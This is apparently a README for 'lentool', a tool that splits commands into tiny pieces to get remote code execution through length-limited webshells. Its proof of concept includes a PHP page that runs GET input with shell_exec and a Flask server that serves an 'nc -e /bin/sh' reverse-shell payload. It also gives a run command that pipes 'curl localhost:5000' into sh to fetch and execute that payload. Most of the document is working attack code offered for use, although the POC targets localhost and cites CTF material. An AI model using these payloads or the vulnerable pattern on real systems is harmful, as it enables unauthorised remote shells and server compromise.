# Description
Tool to RCE in limited input length webshells.  
It pipes the payload to sh, you can customize it with a few changes in the source code (python is already done, just uncomment it), also you could modify it to execute commands directly.

# Usage
```
usage: lentool.py [-h] -c COMMAND -t TARGET [-s MAX_SIZE] [-d DELAY]

optional arguments:
  -h, --help            show this help message and exit
  -c COMMAND, --command COMMAND
                        Payload location
  -t TARGET, --target TARGET
                        Url target (with param ex: http://target?cmd
  -s MAX_SIZE, --max-size MAX_SIZE
                        Maximum amount of characters per request
  -d DELAY, --delay DELAY
                        Time to wait between requests in tenths of a second
```
 # POC
 ## Vulnerable application:
 ```php
 <?php
 
$sandbox = '/home/estse/sandbox/';
@mkdir($sandbox);
@chdir($sandbox);

if (!isset($_GET['start'])){
	show_source(__FILE__);
	exit;
}

// This will return output only for id and ps.
if (strlen($_GET['start']) < 5){
	echo shell_exec($_GET['start']);
} else {
	echo "Please enter a valid command";
}

?>
 ```
 ## Flask server to host the payload:
 ```python
from flask import Flask, Response
 
app = Flask(__name__)
 
@app.route('/')
def i():
    return Response("nc -e /bin/sh 127.0.0.1 1234", headers={'Content-Type': 'text/plain'}, status=200)
 
if __name__ == '__main__':
    app.run(host='0.0.0.0',port=5000)
```
## Run:
```
python3 lentool.py -c 'curl localhost:5000|sh' -t http://127.0.0.1/index.php?start -s 4
```
 

https://user-images.githubusercontent.com/40002393/154508216-648b8403-f78a-4298-b68c-85944a2118e1.mp4

# References
https://err0rzz.github.io/2017/11/13/ctf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/
